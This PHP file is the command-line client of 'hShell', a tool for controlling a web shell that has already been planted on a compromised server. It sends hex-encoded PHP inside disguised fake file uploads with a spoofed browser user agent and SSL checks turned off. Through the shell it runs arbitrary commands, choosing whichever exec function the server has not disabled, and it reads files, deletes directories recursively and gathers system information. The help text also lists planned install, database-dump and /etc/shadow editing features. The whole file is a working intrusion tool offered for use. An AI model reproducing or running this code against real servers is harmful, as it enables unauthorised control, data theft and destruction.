<?php

class Client
{
    private $prompt;
    private $shell_url;
    private $current_dir;

    public function __construct($argv)
    {
        // Started values
        $this->prompt      = 'hShell%s';
        $this->shell_url   = false;
        $this->current_dir = false;

        // Check for CLI mode
        if(php_sapi_name() === 'cli') 
        {
            // Header for welcome
            echo " ──────────── Welcome to hShell 💀 v0.5 Alpha ───────────────── \n";
            echo "  Author             : WHK@elhacker.net                         \n";
            echo "  For bugs & updates : https://github.com/WHK102/hShell         \n";
            echo "  Thanks             : To my computer, coffee and the weekend   \n";
            echo " ────────────────────────────────────────────────────────────── \n";

            // The main loop
            while(true)
            {
                if($this->current_dir !== false)
                {
                    // Get the command
                    echo sprintf($this->prompt, ':'.$this->current_dir.'> ');
                    $line = trim(fgets(STDIN));

                    if($line === '')
                    {
                        continue;
                    }
                    else if(strpos($line, ' ') !== false)
                    {
                        $parts = explode(' ', $line);
                        $command = array_shift($parts);
                        $this->callExec($command, $parts, true);
                    }
                    else
                    {
                        $this->callExec($line, null, true);
                    }
                }
                else
                {
                    echo "+ Connect to url: ";
                    $url = trim(fgets(STDIN));
                    $this->callExec('connect', array($url), true);
                }
            }
        }
        else
        {
            echo "! Only for CLI mode.\n";
        }
    }

    private function callExec($command, $argv, $echo = true)
    {
        if(in_array($command, array('connect')))
        {
            if($this->shell_url)
            {
                echo "! Disconnected for the current server.";
            }

            // Try connect to remote server shell
            $this->shell_url = (count($argv) > 0) ? trim(implode(' ', $argv)) : '';
            if(filter_var($this->shell_url, FILTER_VALIDATE_URL))
            {
                echo "+ Connecting ...\n";
                $this->current_dir = $this->callExec('shellpath', null, false);
                if($this->current_dir)
                {
                    echo "+ Connected!\n";
                }
                else
                {
                    echo "! Unable to connect, try again.\n";
                    $this->current_dir = false;
                    $this->shell_url   = false;
                }
            }
            else
            {
                echo "! Invalid URL.\n";
                $this->current_dir = false;
                $this->shell_url   = false;
            }
        }
        else if(in_array($command, array('help')))
        {
            echo implode("\n", array(
                "  NOTE: * is under construction.",
                "  Command             | Description",
                " ────────────────────────────────────────────────────────────── ",
                "  connect [url]       : Connect to Server WebShell script.",
                "  help                : Show help of the client.",
                "  cat                 : Show the content of remote file.",
                "* tail [file path]    : Read the last lines of specific file.",
                "  cd [directory]      : Navigate to specific remote directory.",
                "  shell [command]     : Execute a simple command in remote server using the",
                "      current remote path. Detect automatic available method on the server.",
                "      See the call-exec command. Alias of exec and system commands.",
                "  force-shell [method] [command] : Force execute a simple command in remote",
                "      server using an specific php method in current path. Alias of force-exec",
                "      and force-system commands.",
                "      Available methods: system, exec, shell_exec, passthru, popen, proc_open,",
                "      explicit (using double quotes `).",
                "* edit [editor command] [file path] : Edit remote file with specific local",
                "      command edtor, example: edit vi /etc/shadow",
                "* nano [file path]    : Edit remote file with nano editor on the local system.",
                "* vi [file path]      : Edit remote file with vi editor on the local system.",
                "* vim [file path]     : Edit remote file with vim editor on the local system.",
                "* gedit [file path]   : Edit remote file with gedit editor on the local system.",
                "* notepad [file path] : Edit remote file with notepad editor on the local",
                "      system.",
                "* sublime [file path] : Edit remote file with sublime text editor on the local",
                "      system.",
                "* uninstall           : Uninstall the current WebShell on the server.",
                "* install [file path] : Install the WebShell on the specific remote parh.",
                "* mysql [host] [port] [user] [password] : Start an interative MySQL shell",
                "      connection on the remote server.",
                "* mysqldump [host] [port] [user] [password] [local file] : Make a dump from",
                "      remote database to local file .sql"
                "* download [remote path] [local path] : Download a backup of file or directory",
                "      from server to local path.",
                "* upload [local path] [remote path] : Upload a local file or directory to",
                "      remote directory (maintains the same permits)",
                "  rm [path]           : Delete the specific file or directory path.",
                "  mkdir [path]        : Make a directory on the server.",
                "  phpinfo             : Show the full info of the php, libraries and enviroments",
                "      of the server.",
                "  id                  : Show the full info of the current user and group on the",
                "      server.",
                "  ls                  : List files and folders of the current path on the",
                "      server. Alias of ll and dir commands.",
                "  shellpath           : Show the current local path of the WebShell server.",
                "  pwd                 : Show the current local path on the server.",
                "  uname               : Show the full info of the System Operative of the",
                "      server.",
                "  exit                : Exit of the client but not remove the WebShell on the",
                "      server. See uninstall. Alias of quit command.",
                ""
            ));
        }
        else if(in_array($command, array('edit')))
        {
            $filename = (count($argv) > 0) ? implode(' ', $argv) : '';
            // TODO: Download, edit and upload
            // TODO: Under construction.
            echo "! Under construction.\n";
        }
        else if(in_array($command, array('nano')))
        {
            array_unshift($argv, 'nano'); // Add the specific editor
            $this->callExec($command, $argv);
        }
        else if(in_array($command, array('vi')))
        {
            array_unshift($argv, 'vi'); // Add the specific editor
            $this->callExec($command, $argv);
        }
        else if(in_array($command, array('vim')))
        {
            array_unshift($argv, 'vim'); // Add the specific editor
            $this->callExec($command, $argv);
        }
        else if(in_array($command, array('gedit')))
        {
            array_unshift($argv, 'gedit'); // Add the specific editor
            $this->callExec($command, $argv);
        }
        else if(in_array($command, array('notepad')))
        {
            array_unshift($argv, 'notepad'); // Add the specific editor
            $this->callExec($command, $argv);
        }
        else if(in_array($command, array('sublime')))
        {
            // TODO: Under construction
            // TODO: find on /opt o %programfiles%
            // array_unshift($argv, '/opt/sublime/sublime');
            array_unshift($argv, 'sublime'); // Add the specific editor
            $this->callExec($command, $argv);
        }
        else if(in_array($command, array('uninstall')))
        {
            // TODO: Under construction.
            echo "! Under construction.\n";
        }
        else if(in_array($command, array('install')))
        {
            $filename = (count($argv) > 0) ? implode(' ', $argv) : '';
            // TODO: Under construction.
            echo "! Under construction.\n";
        }
        else if(in_array($command, array('force-shell', 'force-exec', 'force-system')))
        {
            // TODO: add: pcntl_exec
            if(count($argv) > 1)
            {
                $method  = array_shift($argv);
                $command = implode(' ', $argv);

                if($method === 'system')
                {
                    $this->sendBuffer('
                        system("'.$this->escapePHP($command).'");
                    ', 'self::callbackCommandGenericFlush', true);
                    echo "\n";
                }
                else if($method === 'exec')
                {
                    $this->sendBuffer('
                        exec("'.$this->escapePHP($command).'", $lines);
                        echo implode("\n", $lines)."\n";
                    ', 'self::callbackCommandGenericFlush', true);
                    echo "\n";
                }
                else if($method === 'shell_exec')
                {
                    $this->sendBuffer('
                        echo shell_exec("'.$this->escapePHP($command).'");
                    ', 'self::callbackCommandGenericFlush', true);
                    echo "\n";
                }
                else if($method === 'passthru')
                {
                    $this->sendBuffer('
                        echo passthru("'.$this->escapePHP($command).'");
                    ', 'self::callbackCommandGenericFlush', true);
                    echo "\n";
                }
                else if($method === 'popen')
                {
                    $this->sendBuffer('
                        $handler = popen("'.$this->escapePHP($command).'", "r");
                        while(!feof($handler))
                        {
                            echo fread($handler, 1024);
                        }
                        @pclose($handler);
                    ', 'self::callbackCommandGenericFlush', true);
                    echo "\n";
                }
                else if($method === 'proc_open')
                {
                    $this->sendBuffer('
                        $process = proc_open("'.$this->escapePHP($command).'", array(
                           0 => array("pipe", "r"),
                           1 => array("pipe", "w")
                        ), $pipes, $current_dir, array());

                        if (is_resource($process))
                        {
                            fclose($pipes[0]);
                            echo stream_get_contents($pipes[1]);
                            fclose($pipes[1]);
                            proc_close($process);
                        }
                    ', 'self::callbackCommandGenericFlush', true);
                    echo "\n";
                }
                else if($method === 'explicit')
                {
                    $this->sendBuffer('
                        $command = "'.$this->escapePHP($command).'";
                        echo `$command`;
                    ', 'self::callbackCommandGenericFlush', true);
                    echo "\n";
                }
                else
                {
                    echo "! Unknown method. See help command.";
                }
            }
            else
            {
                echo "! Need more arguments";
            }
        }
        else if(in_array($command, array('shell', 'exec', 'system')))
        {
            // TODO: add: pcntl_exec

            $command = (count($argv) > 0) ? implode(' ', $argv) : '';

            $this->sendBuffer('
                $command     = "'.$this->escapePHP($command).'";
                $current_dir = "'.$this->escapePHP($this->current_dir).'";
                $disabled    = @ini_get("disable_functions");

                if($disabled)
                {
                    // Get disabled functions
                    $disabled = explode(",", $disabled);
                    $disabled = array_map(trim, $disabled);
                    $disabled = array_map(strtolower, $disabled);

                    // Possible methods to use
                    $enabled = array("system", "exec", "shell_exec", "passthru", "popen", "proc_open");

                    // Determines what method can be used.
                    if(!in_array("system", $disabled))
                    {
                        system($command);
                    }
                    else if(!in_array("exec", $disabled))
                    {
                        exec($command, $lines);
                        echo implode("\n", $lines)."\n";
                    }
                    else if(!in_array("shell_exec", $disabled))
                    {
                        echo shell_exec($command);
                    }
                    else if(!in_array("passthru", $disabled))
                    {
                        echo passthru($command);
                    }
                    else if(!in_array("popen", $disabled))
                    {
                        $handler = popen($command, "r");
                        while(!feof($handler))
                        {
                            echo fread($handler, 1024);
                        }
                        @pclose($handler); // Dissabled?
                    }
                    else if(!in_array("proc_open", $disabled))
                    {
                        $process = proc_open($command, array(
                           0 => array("pipe", "r"),
                           1 => array("pipe", "w")
                        ), $pipes, $current_dir, array());

                        if (is_resource($process))
                        {
                            fclose($pipes[0]);
                            echo stream_get_contents($pipes[1]);
                            fclose($pipes[1]);
                            proc_close($process);
                        }
                    }
                    else
                    {
                        echo `$command`;
                    }
                }
                else
                {
                    echo `$command`;
                }
                
            ', 'self::callbackCommandGenericFlush', true);
            echo "\n";
        }
        else if(in_array($command, array('mysql')))
        {
            // TODO: Add support to mysql, postgre, oracle, mssql, h2, mongo and use as argument: database [driver] [connection schema]
            // TODO: Under construction.
            echo "! Under construction.\n";
        }
        else if(in_array($command, array('mysqldump')))
        {
            // TODO: Under construction.
            echo "! Under construction.\n";
        }
        else if(in_array($command, array('download')))
        {
            // TODO: Under construction.
            echo "! Under construction.\n";
        }
        else if(in_array($command, array('upload')))
        {
            // TODO: Under construction.
            echo "! Under construction.\n";
        }
        else if(in_array($command, array('cat')))
        {
            $filename = (count($argv) > 0) ? implode(' ', $argv) : '';

            $this->sendBuffer('
                $path = "'.$this->escapePHP($filename).'";

                if(file_exists($path) && is_file($path))
                {
                    if(is_readable($path))
                    {
                        $handler = fopen($path, "r");
                        if($handler)
                        {
                            while(!feof($handler))
                            {
                                echo fgets($handler, 1024);
                            }
                            fclose($handler);
                        }
                    }
                    else
                    {
                        echo "! You do not have permission to read the file.";
                    }
                }
                else
                {
                    echo "! The file does not exists.";
                }
            ', 'self::callbackCommandGenericFlush', true);
            echo "\n";
        }
        else if(in_array($command, array('tail')))
        {
            $filename = (count($argv) > 0) ? implode(' ', $argv) : '';
            // TODO: Under construction.
        }
        else if(in_array($command, array('rm')))
        {
            $path = (count($argv) > 0) ? implode(' ', $argv) : '';

            $result = $this->sendBuffer('
                $path = "'.$this->escapePHP($path).'";

                function del_tree($dir)
                {
                    $files = array_diff(scandir($dir), array(".", ".."));
                    foreach ($files as $file)
                    {
                        if(is_dir("$dir/$file"))
                        {
                            del_tree("$dir/$file");
                        }
                        else
                        {
                            @unlink("$dir/$file");
                        }
                    }
                    return @rmdir($dir);
                } 

                if(is_dir($path))
                {
                    if(del_tree($path))
                    {
                        $result = 1;
                    }
                    else
                    {
                        $result = 0;
                    }
                }
                else if(is_file($path))
                {
                    if(unlink($path))
                    {
                        $result = 1;
                    }
                    else
                    {
                        $result = 0;
                    }
                }
                else
                {
                    $result = -1;
                }
            ');

            if($echo)
            {
                if((int)$result === 0)
                {
                    echo "Unable to delete the file or directory. Verify that you have permissions.\n";
                }
                else if((int)$result === -1)
                {
                    echo "The file or directory does not exist.\n";
                }
                else if((int)$result === 1)
                {
                    echo "Deleted!.\n";
                }
                else
                {
                    echo "Error 500: invalid status.\n";
                }
            }
            return $result;
        }
        else if(in_array($command, array('mkdir')))
        {
            $dirname = (count($argv) > 0) ? implode(' ', $argv) : '';

            $result = $this->sendBuffer('
                $result = 0;
                if(@mkdir("'.$this->escapePHP($dirname).'", 0777, true))
                {
                    $result = 1;
                }
            ');

            if($echo && ((int)$result === 0))
            {
                echo "Unable to create the directory on this route.\n";
            }
            return $result;
        }
        elseif(in_array($command, array('phpinfo')))
        {

            $result = $this->sendBuffer('
                ob_start();
                phpinfo(-1);

                $pi = preg_replace(
                    array(
                        "#PHP Credits(.*)#ms",
                        "#^.*<body>(.*)</body>.*$#ms", "#<h2>PHP License</h2>.*$#ms",
                        "#<h1>Configuration</h1>#", "#\r?\n#", "#</(h1|h2|h3|tr)>#",
                        "# +<#", "#[ \t]+#", "#&nbsp;#", "#  +#", "# class=\\".*?\\"#", "%&#039;%", 
                        "#<tr>(?:.*?)\\" src=\\"(?:.*?)=(.*?)\\" alt=\\"PHP Logo\\" /></a><h1>PHP Version (.*?)</h1>(?:\n+?)</td></tr>#",
                        "#<tr>(?:.*?)\\" src=\\"(?:.*?)=(.*?)\\"(?:.*?)Zend Engine (.*?),(?:.*?)</tr>#",
                        "# +#", "#<tr>#", "#</tr>#"
                    ),
                    array(
                        "", "\\$1", "", "", "", "</\\$1>\n", "<", " ", " ", " ", "", " ",
                        "<h2>PHP Configuration</h2>\n"."<tr><td>PHP Version</td><td>\\$2</td></tr>".
                        "\n<tr><td>PHP Egg</td><td>\\$1</td></tr>",
                        "<tr><td>Zend Engine</td><td>\\$2</td></tr>\n".
                        "<tr><td>Zend Egg</td><td>\\$1</td></tr>", " ", "%S%", "%E%"
                    ),
                    ob_get_clean()
                );

                $sections = explode("<h2>", strip_tags($pi, "<h2><th><td>"));
                unset($sections[0]);

                $pi = array();
                foreach($sections as $section){
                    $n = substr($section, 0, strpos($section, "</h2>"));
                    preg_match_all("#%S%(?:<td>(.*?)</td>)?(?:<td>(.*?)</td>)?(?:<td>(.*?)</td>)?%E%#", $section, $askapache, PREG_SET_ORDER);
                    foreach($askapache as $m)
                        $pi[$n][$m[1]]= (!isset($m[3]) || $m[2] == $m[3]) ? $m[2] : array_slice($m, 2);
                }
                
                $result = $pi;
            ');

            if($echo)
            {
                foreach($result as $title => $items)
                {
                    echo 
                        "+".str_repeat("-", 78)."+\n".
                        "| ".str_pad(" ".strtoupper($title)." ", 76, ' ', STR_PAD_BOTH)." |\n".
                        "+".str_repeat("-", 78)."+\n";

                    foreach($items as $var => $val)
                    {
                        if(is_array($val))
                            $val = implode(", ", $val);
                        $var = htmlspecialchars_decode($var, ENT_QUOTES);
                        $val = htmlspecialchars_decode($val, ENT_QUOTES);

                        echo '| '.str_pad($var, 36, ' ', STR_PAD_RIGHT).' | '.str_pad($val, 37, ' ', STR_PAD_RIGHT)." |\n";
                    }
                    echo "+".str_repeat("-", 78)."+\n\n";
                }
            }

            return $result;
        }
        else if(in_array($command, array('cd')))
        {
            // Default browse "/"
            $dir = (count($argv) > 0) ? implode(' ', $argv) : '/';

            $result = $this->sendBuffer('
                if(
                    is_dir("'.$this->escapePHP($dir).'") &&
                    is_readable("'.$this->escapePHP($dir).'")
                )
                {
                    @chdir("'.$this->escapePHP($dir).'");
                }

                $result = getcwd();
            ');

            if($this->current_dir == $result)
            {
                echo "The directory does not exist or is inaccessible..\n";
            }
            else
            {
                $this->current_dir = $result;
            }

            return $result;
        }
        else if(in_array($command, array('id')))
        {
            $result = $this->sendBuffer('
                $uid       = getmyuid();
                $gid       = getmygid();
                $username  = get_current_user();
                $groupname = "";

                if(function_exists("posix_getgrgid"))
                {
                    if($groupname = @posix_getgrgid($gid))
                    {
                        $groupname = $groupname["name"];
                    }
                }

                $result = "uid=".$uid."(".$username.") gid=".$gid."(".$groupname.")";
            ');

            if($echo)
            {
                echo $result."\n";
            }

            return $result;
        }
        else if(in_array($command, array('ls', 'll', 'dir')))
        {
            $result = $this->sendBuffer('
                clearstatcache();

                $files        = array();
                $dirs         = array();
                $dir_handler  = opendir("./");

                while (false !== ($filename = readdir($dir_handler)))
                {
                    $info = @stat($filename);
                    
                    $user_name  = "-";
                    $group_name = "-";
                    
                    if($info)
                    {
                        if(function_exists("posix_getpwuid"))
                        {
                            if($user_name = @posix_getpwuid($info["uid"]))
                            {
                                $user_name = $user_name["name"];
                            }
                        }

                        if(function_exists("posix_getgrgid"))
                        {
                            if($group_name = @posix_getgrgid($info["gid"]))
                            {
                                $group_name = $group_name["name"];
                            }
                        }

                        $item = array(
                            "name"        => $filename,
                            "perms"       => $info["mode"],
                            "size"        => $info["size"],
                            "user_name"   => $user_name,
                            "group_name"  => $group_name
                        );
                    }
                    else
                    {
                        $item = array(
                            "name"        => $filename,
                            "perms"       => 0000,
                            "size"        => 0,
                            "user_name"   => "-",
                            "group_name"  => "-"
                        );
                    }

                    if(is_dir($filename))
                    {
                        $item["name"] .= "/";
                        $dirs[] = $item;
                    }
                    else
                    {
                        $files[] = $item;
                    }
                }

                sort($dirs);
                sort($files);

                $result = array_merge($dirs, $files);
            ');

            if($echo)
            {
                $limits = array(
                    'max_size_perms'     => strlen('Permissions'),
                    'max_size_username'  => strlen('User'),
                    'max_size_groupname' => strlen('Group'),
                    'max_size_size'      => strlen('Size'),
                    'max_size_name'      => strlen('Name')
                );
                $lines = array();

                foreach($result as $item)
                {
                    $line = array(
                        'perms'     => $this->octToHumanPerms($item->perms),
                        'username'  => $item->user_name,
                        'groupname' => $item->group_name,
                        'size'      => $this->formatBytes($item->size),
                        'name'      => $item->name
                    );

                    // Set limits
                    if(strlen($line['perms']) > $limits['max_size_perms'])
                    {
                        $limits['max_size_perms'] = strlen($line['perms']);
                    }

                    if(strlen($line['username']) > $limits['max_size_username'])
                    {
                        $limits['max_size_username'] = strlen($line['username']);
                    }

                    if(strlen($line['groupname']) > $limits['max_size_groupname'])
                    {
                        $limits['max_size_groupname'] = strlen($line['groupname']);
                    }

                    if(strlen($line['size']) > $limits['max_size_size'])
                    {
                        $limits['max_size_size'] = strlen($line['size']);
                    }

                    if(strlen($line['name']) > $limits['max_size_name'])
                    {
                        $limits['max_size_name'] = strlen($line['name']);
                    }

                    $lines[] = $line;
                }

                echo substr(
                    "  ".str_pad('Permissions',          $limits['max_size_perms'],     " ", STR_PAD_RIGHT)." ".
                    "  ".str_pad('User',                 $limits['max_size_username'],  " ", STR_PAD_RIGHT)." ".
                    "  ".str_pad('Group',                $limits['max_size_groupname'], " ", STR_PAD_RIGHT)." ".
                    "  ".str_pad('Size',                 $limits['max_size_size'],      " ", STR_PAD_RIGHT)." ".
                    "  ".str_pad('Name',                 $limits['max_size_name'],      " ", STR_PAD_RIGHT)." "
                , 0, 80)."\n ────────────────────────────────────────────────────────────── \n";

                foreach($lines as $line)
                {
                    echo
                        "  ".str_pad($line['perms'],     $limits['max_size_perms'],     " ", STR_PAD_LEFT )." ".
                        "  ".str_pad($line['username'],  $limits['max_size_username'],  " ", STR_PAD_RIGHT)." ".
                        "  ".str_pad($line['groupname'], $limits['max_size_groupname'], " ", STR_PAD_RIGHT)." ".
                        "  ".str_pad($line['size'],      $limits['max_size_size'],      " ", STR_PAD_LEFT )." ".
                        "  ".$line['name']."\n";
                }
            }

            return $result;
        }
        else if(in_array($command, array('shellpath')))
        {
            $result = $this->sendBuffer('
                $result = dirname(__file__)."/";
            ');

            if($echo)
            {
                echo $result."\n";
            }

            return $result;
        }
        else if(in_array($command, array('pwd')))
        {
            if($echo)
            {
                echo $this->current_dir."\n";
            }

            return $this->current_dir;
        }
        else if(in_array($command, array('uname')))
        {
            $result = $this->sendBuffer('
                $result = php_uname();
            ');

            if($echo)
            {
                echo $result."\n";
            }

            return $result;
        }
        else if(in_array($command, array('exit', 'quit')))
        {
            echo "! Bye.\n";
            exit;
        }
        else
        {
            echo "! Command not found.\n";
        }
    }

    private function sendBuffer($buffer_sent, $callback_line = false, $raw_mode = false)
    {
        // Final function
        $buffer_sent = '
            @chdir("'.$this->escapePHP($this->current_dir).'");
            $result = "";

            '.$buffer_sent.'
        ';

        if(!$raw_mode)
        {
            $buffer_sent .= '
                echo bin2hex(json_encode(array(
                    "status" => 1,
                    "result" => $result
                )));
            ';
        }

        $file_data       = $this->getRandomFileData();
        $finger_part     = '--------------------------'.microtime(true);

        $handler = fopen($this->shell_url, 'r', false, stream_context_create(array(
            'ssl'  => array(
                'verify_peer'      => false,
                'verify_peer_name' => false,
            ),
            'http' => array(
                'method'           => 'POST',
                'user_agent'       => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0',
                'ignore_errors'    => true,
                'follow_location'  => false,
                'header'           => implode("\r\n", array(
                    'Content-Type: multipart/form-data; boundary='.$finger_part
                )),
                'content'          => implode("\r\n", array(
                    '--'.$finger_part,
                    'Content-Disposition: form-data; name="'.$file_data['input'].'"; filename="'.$file_data['name'].'"',
                    'Content-Type: '.$file_data['content_type'],
                    '',
                    bin2hex($buffer_sent),
                    '--'.$finger_part.'--'
                )),
            )
        )));
        if ($handler)
        {
            $buffer = '';
            while (!feof($handler))
            {
                if($callback_line)
                {
                    // Prevents storing the entire buffer in memory.
                    // Useful for reading large flows with few hardware resources.
                    call_user_func($callback_line, fgets($handler));
                }
                else
                {
                    $buffer .= fgets($handler, 4096);
                }
                
            }
            fclose($handler);

            if(!$raw_mode)
            {
                if($return = @hex2bin($buffer))
                {
                    if($return = @json_decode($return))
                    {
                        return $return->result;
                    }
                    else
                    {
                        echo 
                            "! There was an error in the execution of the server side (corrupt Json):\n".
                            str_repeat('─', 80)."\n".
                            "> Buffer: ".$buffer."\n".
                            str_repeat('─', 80)."\n".
                            "> Decoded: ".$return."\n".
                            str_repeat('─', 80)."\n";
                    }
                }
                else
                {
                    echo 
                        "! There was an error in the execution of the server side (corrupt encoding):\n".
                        str_repeat('─', 80)."\n".
                        "> CodeExec: ".$buffer_sent."\n".
                        str_repeat('─', 80)."\n".
                        "> Response of server: ".$buffer."\n".
                        str_repeat('─', 80)."\n";
                }
            }
        }
        else
        {
            echo "! Unable to connect.";
        }

        // Execution error
        return '';
    }

    private function getRandomString($max_length = 5, $min_length = 13)
    {
        $longitud = rand((int)$max_length, (int)$min_length);

        $chars = 'abcdefghijklmnopqrstuvwxyz';
        $string = '';
        for ($i = 0; $i < $longitud; $i++)
        {
            $string .= $chars[rand(0, strlen($chars) - 1)];
        }
        return $string;
    }

    private function getRandomFileData()
    {
        $types = array(
            array('extension' => 'png', 'content_type' => 'image/png'),
            array('extension' => 'jpg', 'content_type' => 'image/jpeg'),
            array('extension' => 'gif', 'content_type' => 'image/gif'),
            array('extension' => 'pdf', 'content_type' => 'application/pdf'),
            array('extension' => 'doc', 'content_type' => 'application/vnd.ms-word'),
            array('extension' => 'xls', 'content_type' => 'application/vnd.ms-excel'),
            array('extension' => 'txt', 'content_type' => 'text/plain')
        );

        $data = $types[rand(0, count($types) - 1)];

        return array(
            'input'        => $this->getRandomString(5, 11),
            'name'         => $this->getRandomString(5, 11).'.'.$data['extension'],
            'content_type' => $data['content_type']
        );
    }

    private function octToHumanPerms($mode)
    {
        // http://php.net/manual/en/function.stat.php
        $mode = (int)$mode;

        $ts=array(
            0140000 => 'ssocket',
            0120000 => 'llink',
            0100000 => '-file',
            0060000 => 'bblock',
            0040000 => 'ddir',
            0020000 => 'cchar',
            0010000 => 'pfifo'
        );

        $t = decoct($mode & 0170000); // File Encoding Bit

        $str  = (array_key_exists(octdec($t),$ts))?$ts[octdec($t)]{0}:'u';
        $str .= (($mode&0x0100)?'r':'-').(($mode&0x0080)?'w':'-');
        $str .= (($mode&0x0040)?(($mode&0x0800)?'s':'x'):(($mode&0x0800)?'S':'-'));
        $str .= (($mode&0x0020)?'r':'-').(($mode&0x0010)?'w':'-');
        $str .= (($mode&0x0008)?(($mode&0x0400)?'s':'x'):(($mode&0x0400)?'S':'-'));
        $str .= (($mode&0x0004)?'r':'-').(($mode&0x0002)?'w':'-');
        $str .= (($mode&0x0001)?(($mode&0x0200)?'t':'x'):(($mode&0x0200)?'T':'-'));

        return $str;
    }

    private function escapePHP($string)
    {
        return str_replace(array('+', '%'), array(' ', '\\x'), urlencode($string));
    }

    private function formatBytes($bytes, $precision = 2) { 
        $units = array('B', 'K', 'M', 'G', 'T', 'P'); 

        $bytes = max($bytes, 0); 
        $pow = floor(($bytes ? log($bytes) : 0) / log(1024)); 
        $pow = min($pow, count($units) - 1); 

        $bytes /= pow(1024, $pow);
        // $bytes /= (1 << (10 * $pow)); 

        return round($bytes, $precision).$units[$pow]; 
    }

    private function callbackCommandGenericFlush($line)
    {
        echo $line;
    }
}

$client = new Client($argv);